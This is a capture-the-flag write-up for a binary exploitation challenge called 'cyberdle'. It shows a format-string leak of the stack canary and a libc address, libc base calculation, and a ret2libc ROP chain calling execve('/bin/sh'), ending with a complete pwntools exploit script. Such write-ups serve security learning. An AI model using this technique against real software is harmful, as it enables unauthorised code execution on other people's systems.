

libc starts around 0x7ff

This was a very difficult challenge. We're given a binary, an ld file and a libc file. Right off the bat this indicates that we have to do a ret2libc attack. The protections for this binary is:

```
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    RUNPATH:    b''
    Stripped:   No
```


So this is going to be a pretty convoluted multi-stage exploit. Just running the program I observe that you can send input and either overflow a buffer or leak addresses on the stack, like this:

```
0: 0 1 2 3 4 %53$p        
Not a valid word

1: Not a valid word

2: Not a valid word

3: Not a valid word

4: Not a valid word

5: Not a valid word
0x7898eb029e40 was not the correct word...

Lets play a game of cyberdle!
```

Or like this:

```
0: 0 1 2 3 4 AAAAAAAAAAAAAAA
Not a valid word

1: Not a valid word

2: Not a valid word

3: Not a valid word

4: Not a valid word

5: Not a valid word
aaaaaAAAAAAAAAA was not the correct word...
*** stack smashing detected ***: terminated
[1]    149288 IOT instruction (core dumped)  ./cyberdle
```

Which is great news. So basically now I have to leak the address of the stack canary and the address of a known function and put it together. Sounds easy enough, right?

# leaking the canary
I used a seperate fuzzing script for both the canary and the libc function. The canary can be recognized by the fact that it always stops with a 0 byte.

Strangely the canary shared 2 bytes with the base pointer, which seemed weird to me. But when I placed it in the appropriate place just below the base pointer it worker, so hey. The offset required turned out to be 19

```
pwndbg> x/gx $rbp
0x7fffffffdc82: 0xdc00000075750035

pwndbg> x/gx $rbp+6
0x7fffffffdc88: 0xc9749db6d15cdc00

canary --all
--- snip ---
00:0000│+006 0x7fffffffdc88 ◂— 0xc9749db6d15cdc00
```
- Meaning that the canary starts at +6 offset from the [[base pointer]] (i.e. they share 2 bytes)

Now that I have leaked the canary and have successfully placed it on the stack in my payload I in theory have complete control of the stack. Now on to leaking a known function in libc.


# Leaking libc
Using the same fuzzing script I found the function `__libc_start_main` with the offset 53 (as seen on the example above). This was sort of tricky. Libc usually sits around the 0x7ff range, but in this case it was around the 0x702 range.

- Now that we have a known function address the methodology is essentially:
	- Take the address of the known function and subtract the offset from the base of libc to the function.
	- Now you have the address to libc

- This is how I found the offset to the function (The first column is the offset from the base of libc):
```
$ objdump -T libc.so.6| grep __libc_start_main                                                                                                                                                                 
0000000000029dc0 g    DF .text	0000000000000148  GLIBC_2.34  __libc_start_main
0000000000029dc0 g    DF .text	0000000000000148 (GLIBC_2.2.5) __libc_start_main
```

- This is how I calculated the base of libc (still don't really know why I had to subtract 0x80):
```python
libc_start_main_offset = 0x0000000000029dc0

libc = binary.libc
libc_start_main_addr = leaked_addr
libc.address = libc_start_main_addr - libc_start_main_offset - 0x80
```

# Building the ROP chain
Now that we control the stack and know the address to libc, we just let pwntools do the rest:

```python
execve = libc.sym['execve']
binsh = next(libc.search(b'/bin/sh'))
execve_addr = p64(execve)

pop_rdi = next(libc.search(asm("pop rdi; ret")))
pop_rsi = next(libc.search(asm("pop rsi; ret")))
pop_rdx = next(libc.search(asm("pop rdx; pop r12; ret;")))
```

which build the syscall: `execve('/bin/sh', 0, 0)`.

Here is the full solvescript:
```python
from pwn import *
import logging
import sys


context.terminal = "kitty"
context.log_level = "DEBUG"
context.arch = "amd64"


def leak_address(offset, p):

    pay = b"0 1 2 3 4 "
    # pay += f"%43$p".encode() # This gives _rtld_global
    pay += f"%{offset}$p".encode()  # this is libc_start_main

    p.sendlineafter(b"0: ", flat(
        pay
    ))

    p.recvuntil(b"5: Not a valid word\n")

    x = p.recvline()
    y = x.decode()

    return int(y.split(" ")[0], 16)


p = process("./cyberdle")
binary = context.binary = ELF("./cyberdle")
rop = ROP(binary)

#p = gdb.debug("./cyberdle", gdbscript="""
#b *wordle+356
#b *main+161
#""")

leaked_addr = leak_address(53, p)  # leaked_addr: libc_start_main
leaked_canary = leak_address(19, p)

libc_start_main_offset = 0x0000000000029dc0

libc = binary.libc
libc_start_main_addr = leaked_addr
libc.address = libc_start_main_addr - libc_start_main_offset - 0x80


"""
Game inputs
"""
game_inputs = b"C C C C C "
padding = b"A" * 6  # 6 being the array size
popped_before_retp = b"B" * 8 + b"C" * 8 + b"D" * 8 + b'E' * 8 + b'F' * 8 + \
    b'G' * 8 + b'H' * 8  # everything B and H becomes popped off the stack


"""
libc stuff
"""
execve = libc.sym['execve']
binsh = next(libc.search(b'/bin/sh'))
execve_addr = p64(execve)

pop_rdi = next(libc.search(asm("pop rdi; ret")))
pop_rsi = next(libc.search(asm("pop rsi; ret")))
pop_rdx = next(libc.search(asm("pop rdx; pop r12; ret;")))

"""
sanity check
"""
print(f"Leaked canary: {hex(leaked_canary)}")
print(f"Leaked address: {hex(leaked_addr)}")
print(f"Libc base: {hex(libc.address)}")
print(f"execve: {hex(execve)}")
print(f"/bin/sh: {hex(binsh)}")

"""
ROP chain
"""
rop.raw(game_inputs)
rop.raw(padding)
rop.raw(p64(leaked_canary))
rop.raw(popped_before_retp)
rop.raw(pop_rdi)
rop.raw(p64(binsh))
rop.raw(pop_rsi)
rop.raw(0x0)
rop.raw(pop_rdx)
rop.raw(0x0)
rop.raw(0x0)
rop.raw(execve_addr)

p.sendlineafter(b"0: ", rop.chain())

p.interactive()
```